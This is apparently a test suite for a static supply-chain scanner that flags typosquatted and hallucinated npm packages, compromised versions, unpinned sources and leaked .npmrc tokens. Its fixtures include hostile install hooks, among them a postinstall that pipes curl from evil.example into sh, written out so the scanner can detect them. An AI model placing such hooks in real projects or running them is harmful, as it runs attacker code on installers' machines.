import { describe, expect, it } from "vitest";
import { agent } from "../../../src/agents/supply-chain/index.js";
import { parseLockfile } from "../../../src/agents/supply-chain/lockfiles.js";
import { memContext } from "../../helpers/memfs.js";

const pkg = (deps: Record<string, string>, extra: Record<string, unknown> = {}): string =>
  JSON.stringify({ name: "app", version: "1.0.0", dependencies: deps, ...extra }, null, 2);

const npmLock = (pkgs: Record<string, Record<string, unknown>>): string =>
  JSON.stringify({ lockfileVersion: 3, packages: { "": { name: "app" }, ...pkgs } });

const good = { version: "1.0.0", resolved: "https://registry.npmjs.org/x/-/x-1.0.0.tgz", integrity: "sha512-abc" };

async function scan(files: Record<string, string>) {
  const ctx = memContext(files);
  return { findings: await agent.run(ctx), ctx };
}
const ids = (f: { ruleId: string }[]): string[] => f.map((x) => x.ruleId);

describe("agent metadata", () => {
  it("is static-only", () => {
    expect(agent.id).toBe("supply-chain");
    expect(agent.modes).toEqual(["static"]);
  });
});

describe("false-positive guard", () => {
  it("produces zero findings for a clean modern stack", async () => {
    const deps = { react: "^18.3.0", next: "16.3.6", zod: "^3.23.0", "@supabase/supabase-js": "^2.45.0" };
    const lock = npmLock({
      "node_modules/react": good, "node_modules/next": { ...good, version: "16.3.6" }, "node_modules/zod": good,
      "node_modules/@supabase/supabase-js": good,
    });
    const { findings } = await scan({ "package.json": pkg(deps), "package-lock.json": lock });
    expect(findings).toEqual([]);
  });
  it("returns nothing for a repo without package.json", async () => {
    expect((await scan({ "README.md": "hi" })).findings).toEqual([]);
  });
});

describe("SUP-001 typosquat", () => {
  it("flags react-d0m with file and line evidence", async () => {
    const { findings } = await scan({ "package.json": pkg({ react: "^18.0.0", "react-d0m": "^1.0.0" }), "package-lock.json": npmLock({}) });
    const f = findings.find((x) => x.ruleId === "SUP-001");
    expect(f?.severity).toBe("high");
    expect(f?.evidence[0]?.file).toBe("package.json");
    expect(f?.evidence[0]?.line).toBeGreaterThan(1);
    expect(f?.evidence[0]?.snippet).toContain("react-d0m");
    expect(f?.fix.agentPrompt.length).toBeGreaterThan(20);
    expect(f?.cwe).toBe("CWE-1357");
  });
  it("flags scope confusion", async () => {
    const { findings } = await scan({ "package.json": pkg({ "@types-react": "^1.0.0" }), "package-lock.json": npmLock({}) });
    expect(ids(findings)).toContain("SUP-001");
  });
  it("does not flag the legit lookalike preact", async () => {
    const { findings } = await scan({ "package.json": pkg({ preact: "^10.0.0" }), "package-lock.json": npmLock({}) });
    expect(ids(findings)).not.toContain("SUP-001");
  });
  it("skips local workspace package names", async () => {
    const { findings } = await scan({
      "package.json": pkg({ "reactt": "workspace:*" }),
      "package-lock.json": npmLock({}),
    });
    expect(ids(findings)).not.toContain("SUP-001");
  });
});

describe("SUP-002 slopsquat", () => {
  it("flags hallucinated names with no lockfile", async () => {
    const { findings } = await scan({ "package.json": pkg({ "openai-utils": "^1.0.0" }) });
    const f = findings.find((x) => x.ruleId === "SUP-002");
    expect(f?.severity).toBe("medium");
    expect(f?.confidence).toBe("low");
  });
  it("flags when the lock entry lacks integrity", async () => {
    const lock = npmLock({ "node_modules/stripe-helpers": { version: "1.0.0" } });
    const { findings } = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "package-lock.json": lock });
    expect(ids(findings)).toContain("SUP-002");
  });
  it("stays quiet when the lock has a verified entry", async () => {
    const lock = npmLock({ "node_modules/stripe-helpers": good });
    const { findings } = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "package-lock.json": lock });
    expect(ids(findings)).not.toContain("SUP-002");
  });
  it("matches react-<thing>-hooks", async () => {
    const { findings } = await scan({ "package.json": pkg({ "react-form-hooks": "^1.0.0" }) });
    expect(ids(findings)).toContain("SUP-002");
  });
});

describe("SUP-003 install scripts", () => {
  it("flags own postinstall that pipes curl to sh", async () => {
    const { findings } = await scan({
      "package.json": pkg({}, { scripts: { postinstall: "curl -s https://evil.example/x.sh | sh" } }),
    });
    const f = findings.find((x) => x.ruleId === "SUP-003");
    expect(f?.severity).toBe("high");
    expect(f?.evidence[0]?.line).toBeGreaterThan(1);
  });
  it("flags node -e with a URL", async () => {
    const { findings } = await scan({
      "package.json": pkg({}, { scripts: { preinstall: "node -e \"require('https').get('https://e.example')\"" } }),
    });
    expect(ids(findings)).toContain("SUP-003");
  });
  it("ignores benign install hooks", async () => {
    const { findings } = await scan({
      "package.json": pkg({}, { scripts: { postinstall: "node scripts/setup.js", install: "husky install" } }),
    });
    expect(ids(findings)).not.toContain("SUP-003");
  });
  it("reports locked dependencies with install scripts as SUP-009 (low), skipping known builders", async () => {
    const lock = npmLock({
      "node_modules/sketchy": { ...good, hasInstallScript: true },
      "node_modules/esbuild": { ...good, hasInstallScript: true },
    });
    const { findings } = await scan({ "package.json": pkg({ sketchy: "1.0.0" }), "package-lock.json": lock });
    const f = findings.find((x) => x.ruleId === "SUP-009");
    expect(findings.some((x) => x.ruleId === "SUP-003")).toBe(false);
    expect(f?.severity).toBe("low");
    expect(f?.evidence[0]?.snippet).toContain("sketchy");
    expect(f?.evidence[0]?.snippet).not.toContain("esbuild");
  });
});

describe("SUP-004 risky versions", () => {
  it("flags an exact version in package.json", async () => {
    const { findings } = await scan({ "package.json": pkg({ "event-stream": "3.3.6" }), "package-lock.json": npmLock({}) });
    const f = findings.find((x) => x.ruleId === "SUP-004");
    expect(f?.severity).toBe("critical");
    expect(f?.cwe).toBe("CWE-506");
  });
  it("flags a transitive version found only in the lockfile", async () => {
    const lock = npmLock({ "node_modules/colors": { ...good, version: "1.4.1" } });
    const { findings } = await scan({ "package.json": pkg({ react: "18.3.1" }), "package-lock.json": lock });
    expect(findings.filter((x) => x.ruleId === "SUP-004")).toHaveLength(1);
  });
  it("accepts safe versions", async () => {
    const { findings } = await scan({ "package.json": pkg({ "ua-parser-js": "1.0.40" }), "package-lock.json": npmLock({}) });
    expect(ids(findings)).not.toContain("SUP-004");
  });
});

describe("SUP-005 unpinned sources", () => {
  it("flags git, tarball, shorthand, outside file and wildcard", async () => {
    const { findings } = await scan({
      "package.json": pkg({
        a: "git://github.com/x/a.git", b: "https://x.example/b.tgz", c: "user/c",
        d: "file:../d", e: "*", f: "latest",
      }),
      "package-lock.json": npmLock({}),
    });
    expect(findings.filter((x) => x.ruleId === "SUP-005")).toHaveLength(6);
  });
  it("accepts a commit-pinned dependency and in-repo file:", async () => {
    const { findings } = await scan({
      "package.json": pkg({ a: "user/a#0123456789abcdef0123456789abcdef01234567", b: "file:./vendor/b.tgz" }),
      "package-lock.json": npmLock({}),
    });
    expect(ids(findings)).not.toContain("SUP-005");
  });
});

describe("SUP-006 missing lockfile", () => {
  it("flags dependencies without a lockfile", async () => {
    const { findings } = await scan({ "package.json": pkg({ react: "^18.0.0" }) });
    expect(findings.map((f) => f.ruleId)).toEqual(["SUP-006"]);
    expect(findings[0]?.severity).toBe("low");
  });
  it("does not flag packages with no dependencies", async () => {
    expect((await scan({ "package.json": pkg({}) })).findings).toEqual([]);
  });
  it("accepts pnpm and yarn lockfiles", async () => {
    for (const lock of ["pnpm-lock.yaml", "yarn.lock"]) {
      const { findings } = await scan({ "package.json": pkg({ react: "^18.0.0" }), [lock]: "" });
      expect(ids(findings)).not.toContain("SUP-006");
    }
  });
});

describe("SUP-008 .npmrc tokens", () => {
  it("flags, registers and redacts the token", async () => {
    const token = ["npm", "abcdefghijklmnopqrstuvwxyz0123456789"].join("_");
    const { findings, ctx } = await scan({ ".npmrc": `registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${token}\n` });
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.evidence[0]?.line).toBe(2);
    expect(JSON.stringify(findings)).not.toContain(token);
    expect(ctx.secrets.has(token)).toBe(true);
  });
  it("ignores env-var references and gitignored files", async () => {
    const a = await scan({ ".npmrc": "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n" });
    expect(a.findings).toEqual([]);
    const b = await scan({ ".gitignore": ".npmrc\n", ".npmrc": "//r/:_authToken=abcdefghijklmnop\n" });
    expect(b.findings).toEqual([]);
  });
});

describe("monorepos and malformed input", () => {
  it("scans every package.json, shares the root lockfile, skips node_modules", async () => {
    const { findings } = await scan({
      "package.json": pkg({ react: "^18.0.0" }, { workspaces: ["packages/*"] }),
      "package-lock.json": npmLock({}),
      "packages/a/package.json": pkg({ "react-d0m": "1.0.0" }),
      "packages/b/package.json": pkg({ lodash: "*" }),
      "node_modules/evil/package.json": pkg({ "react-d0m": "1.0.0" }),
    });
    expect(ids(findings).sort()).toEqual(["SUP-001", "SUP-005"]);
    expect(findings.map((f) => f.evidence[0]?.file).sort()).toEqual(["packages/a/package.json", "packages/b/package.json"]);
  });
  it("does not crash on malformed JSON and notes it as info", async () => {
    const { findings } = await scan({ "package.json": "{ not json", "packages/x/package.json": "[]" });
    expect(findings.every((f) => f.severity === "info")).toBe(true);
    expect(findings).toHaveLength(2);
  });
  it("survives a corrupt lockfile", async () => {
    const { findings } = await scan({ "package.json": pkg({ react: "^18.0.0" }), "package-lock.json": "{oops" });
    expect(findings).toEqual([]);
  });
});

describe("lockfile parsers", () => {
  it("parses pnpm v9 and v5 keys", () => {
    const text = [
      "lockfileVersion: '9.0'", "packages:",
      "  '@scope/pkg@1.2.3':", "    resolution: {integrity: sha512-x}", "    requiresBuild: true",
      "  lodash@4.17.21:", "    resolution: {integrity: sha512-y}",
      "  /old/1.0.0:", "    resolution: {tarball: https://x}",
      "snapshots:", "  foo@1.0.0: {}", "",
    ].join("\n");
    const info = parseLockfile("pnpm-lock.yaml", "pnpm", text);
    expect(info.byName.get("@scope/pkg")?.[0]).toMatchObject({ version: "1.2.3", hasIntegrity: true, hasInstallScript: true });
    expect(info.byName.get("lodash")?.[0]?.version).toBe("4.17.21");
    expect(info.byName.get("old")?.[0]).toMatchObject({ hasResolved: true, hasIntegrity: false });
    expect(info.byName.has("foo")).toBe(false);
  });
  it("parses yarn classic and berry blocks", () => {
    const text = [
      "# yarn lockfile v1", "", '"@a/b@^1.0.0", "@a/b@^1.1.0":', '  version "1.1.0"',
      '  resolved "https://r/x.tgz"', "  integrity sha512-z", "",
      "__metadata:", "  version: 8", "",
      '"c@npm:^2.0.0":', "  version: 2.0.1", '  resolution: "c@npm:2.0.1"', "  checksum: abc", "",
    ].join("\n");
    const info = parseLockfile("yarn.lock", "yarn", text);
    expect(info.byName.get("@a/b")?.[0]).toMatchObject({ version: "1.1.0", hasResolved: true, hasIntegrity: true });
    expect(info.byName.get("c")?.[0]).toMatchObject({ version: "2.0.1", hasIntegrity: true });
  });
  it("parses npm v1 nested dependencies and skips links", () => {
    const text = JSON.stringify({
      dependencies: { a: { version: "1.0.0", resolved: "r", integrity: "i", dependencies: { b: { version: "2.0.0" } } }, l: { version: "1.0.0", link: true } },
    });
    const info = parseLockfile("package-lock.json", "npm", text);
    expect(info.entries.map((e) => e.name).sort()).toEqual(["a", "b"]);
  });
});
